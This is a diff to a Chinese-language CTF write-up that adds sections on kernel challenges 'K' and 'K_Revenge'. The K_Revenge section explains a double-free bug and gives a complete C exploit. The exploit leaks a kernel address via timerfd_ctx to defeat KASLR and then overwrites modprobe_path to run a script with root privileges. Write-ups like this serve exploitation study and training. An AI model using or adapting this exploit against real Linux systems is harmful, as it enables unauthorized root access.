@@ -74,7 +74,7 @@ typedef struct
 } Elf64_Dyn;
 ```
 
-# dl_runtime_resolve
+## dl_runtime_resolve
 这里他实际上最后调用的是`_dl_fixup`函数, 参数为`struct link_map *l`和`reloc_arg`
 
 接下来的步骤就是先从`link_map`里面获取到`symtab`, `strtab`,`pltgot`
@@ -230,6 +230,210 @@ io.sendline(safe_flat(0, 0, rop.chain()))
 io.interactive()
 ```
 
+# K
+这题真的逆天， 虽然说`/root/flag`的权限是`rwx---------`,但这个文件所有者就是普通用户，直接cat即可
+题目一出70多解，后面出题人放了出来K的复仇
+# K_Revenge
+题目漏洞点存在一个任意大小的double free,这里我们可以使用结构体`timerfd_ctx`
+这里可以实现从`kmalloc-256`池里面分配一个块来赋予`struct timerfd_ctx结构体`，然后向其中填入内容
+
+```c
+struct timerfd_ctx {
+	union {
+		struct hrtimer tmr;
+		struct alarm alarm;
+	} t;
+	ktime_t tintv;
+	ktime_t moffs;
+	wait_queue_head_t wqh;
+	u64 ticks;
+	int clockid;
+	short unsigned expired;
+	short unsigned settime_flags;	/* to show in fdinfo */
+	struct rcu_head rcu;
+	struct list_head clist;
+	spinlock_t cancel_lock;
+	bool might_cancel;
+};
+```
+
+其中结构体的`struct hrtimer tmr `这个字段类型的function字段指向的是一个内核函数，因此他可以泄漏内核代码段基地址,经过实际调试，在这个字段中同样也可以泄露内核堆的地址
+其中利用方式如下：
+```c
+void timer_leak() {
+    int timefd =  syscall(__NR_timerfd_create, CLOCK_REALTIME, 0);
+    struct itimerspec itimerspec;
+
+	itimerspec.it_interval.tv_sec = 0;
+	itimerspec.it_interval.tv_nsec = 0;
+	itimerspec.it_value.tv_sec = 100;
+	itimerspec.it_value.tv_nsec = 0;
+
+	timerfd_settime(timefd, 0, &itimerspec, 0);
+	close(timefd);
+	sleep(1);
+}
+```
+
+本题最终的exp如下
+```c
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <fcntl.h>
+#include <sys/ioctl.h>
+#include <string.h>
+#include <sys/timerfd.h>
+#include <syscall.h>
+
+#define ALLOC 0x1111
+#define READ 0x2222
+#define FREE 0x3333
+
+size_t timerfd_func_addr=0xffffffff812fdb30;
+size_t modeprobe_path_addr = 0xffffffff82b3f100;
+
+#define HOME_PATH "/home/flag.sh"
+char userful_shell[] = "#!/bin/sh\nchmod 777 /root/flag";
+
+
+#define PRINT_ADDR(str, x) printf("\033[0m\033[1;34m[+]%s \033[0m:%p\n", str, x)
+
+void info_log(char* str){
+	 printf("\033[0m\033[1;32m[+]%s\033[0m\n",str);
+}
+
+void error_log(char* str){
+  printf("\033[0m\033[1;31m%s\033[0m\n",str);
+  exit(1);
+}
+
+int dev_fd;
+
+
+struct u_param {
+    size_t limit;
+    void *user_ptr;
+};
+
+void timer_leak() {
+    int timefd =  syscall(__NR_timerfd_create, CLOCK_REALTIME, 0);
+    struct itimerspec itimerspec;
+
+	itimerspec.it_interval.tv_sec = 0;
+	itimerspec.it_interval.tv_nsec = 0;
+	itimerspec.it_value.tv_sec = 100;
+	itimerspec.it_value.tv_nsec = 0;
+
+	timerfd_settime(timefd, 0, &itimerspec, 0);
+	close(timefd);
+	sleep(1);
+}
+
+
+
+int main()
+{
+    size_t kaslr_offset = 0;
+    char payload[0x80] = {0}; 
+    struct u_param param = {0};
+    int pty_fd = 0;
+
+    int fd = open(HOME_PATH, O_RDWR|O_CREAT);
+    write(fd, userful_shell, sizeof(userful_shell));
+    close(fd);
+    system("chmod +x /home/flag.sh");
+    system("echo -e '\\xff\\xff\\xff\\xff' > /home/fake");
+    system("chmod +x /home/fake");
+
+    dev_fd = open("/dev/K", O_RDWR);
+    if(dev_fd < 0){
+        perror("open");
+        exit(1);
+    }
+
+    memset(payload, 'A', sizeof(payload));
+
+    /* alloc 0x100 slab(kmalloc-256) and copy from uesr */
+    param.limit = 0x100;
+    param.user_ptr = payload;
+    if(ioctl(dev_fd, ALLOC, &param)< 0){
+        perror("ioctl");
+        exit(1);
+    }
+
+    /* free 0x100 slab */
+    param.limit = 0x100;
+    param.user_ptr = 0;
+    if(ioctl(dev_fd, FREE, &param)< 0){
+        perror("ioctl");
+        exit(1);
+    }
+
+    /* realloc timerfd_ctx (kmalloc-256) */
+    timer_leak();
+
+
+    // use heap slab(kmalloc-1k) and copy to uesr 
+    param.limit = 0x100;
+    param.user_ptr = payload;
+    if(ioctl(dev_fd, READ, &param)< 0){
+        perror("ioctl");
+        exit(1);
+    }
+
+    /* get the kaslr */
+    kaslr_offset = ((size_t *)payload)[5] - timerfd_func_addr;
+    PRINT_ADDR("kaslr_offset", kaslr_offset);
+    modeprobe_path_addr += kaslr_offset;
+    PRINT_ADDR("modeprobe_path_addr", modeprobe_path_addr);
+
+    param.limit = 0x80;
+    param.user_ptr = payload;
+
+    if(ioctl(dev_fd, ALLOC, &param)< 0){
+        perror("ioctl");
+        exit(1);
+    }
+    if(ioctl(dev_fd, FREE, &param)< 0){
+        perror("ioctl");
+        exit(1);
+    }
+    if(ioctl(dev_fd, FREE, &param)< 0){
+        perror("ioctl");
+        exit(1);
+    }
+
+    /* alloc 0x80 slab(kmalloc-1k) and copy from uesr */
+    /* alloc to the modprobe_path */
+    param.limit = 0x80;
+    param.user_ptr = payload;
+    *(size_t *)&payload[0x40] = modeprobe_path_addr - 0x10;
+    if(ioctl(dev_fd, ALLOC, &param)< 0){
+        perror("ioctl");
+        exit(1);
+    }
+
+    *(size_t *)&payload[0x40] = modeprobe_path_addr - 0x10;
+    if(ioctl(dev_fd, ALLOC, &param)< 0){
+        perror("ioctl");
+        exit(1);
+    }
+
+    memcpy(&payload[0x10], HOME_PATH, 0x10);
+
+    /* has to be modprobe_path */
+    if(ioctl(dev_fd, ALLOC, &param)< 0){
+        perror("ioctl");
+        exit(1);
+    }
+    system("/home/fake");
+
+
+    return 0;
+}
+
+```
 
 # 参考
 [https://blog.imv1.me/2021/04/15/ret2dl_resolve/](https://blog.imv1.me/2021/04/15/ret2dl_resolve/)
